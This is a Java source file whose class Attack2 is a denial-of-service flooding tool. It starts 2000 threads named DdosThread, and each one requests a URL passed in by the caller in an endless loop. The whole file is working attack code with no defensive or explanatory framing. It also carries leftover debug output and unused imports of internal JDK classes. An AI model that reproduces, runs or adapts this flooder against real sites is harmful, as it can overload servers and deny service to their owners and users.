package com.example.freedom1;

import com.sun.deploy.net.URLEncoder;
import sun.net.www.protocol.http.HttpURLConnection;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attack2 {

    public void main1(String title) throws Exception {
        System.out.println(title);
            for (int i = 0; i < 2000; i++) {
                DdosThread thread = new DdosThread(title);
                thread.start();
            }
    }
    public static class DdosThread extends Thread {
        private AtomicBoolean running = new AtomicBoolean(true);
        private String title;

        public DdosThread(String title) {
            this.title = title;
        }

        @Override
        public void run() {
            while (running.get()) {
                try {
                    doInBackground();
                    System.out.println("hgjghjgh");
                } catch (Exception e) {
                    System.out.println("Exception");
                }
            }
        }
        protected String doInBackground() {
            String answerHTTP;
            URL url;
            HttpsURLConnection urlConnection = null;
            String server = title;
            try {
                url = new URL(server);
                urlConnection = (HttpsURLConnection) url.openConnection();
                int responseCode = urlConnection.getResponseCode();
                if(responseCode == HttpsURLConnection.HTTP_OK){
                    answerHTTP = (urlConnection.getInputStream()).toString();
                    System.out.println(answerHTTP);
                }

            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
            }
            return null;
        }
    }
}
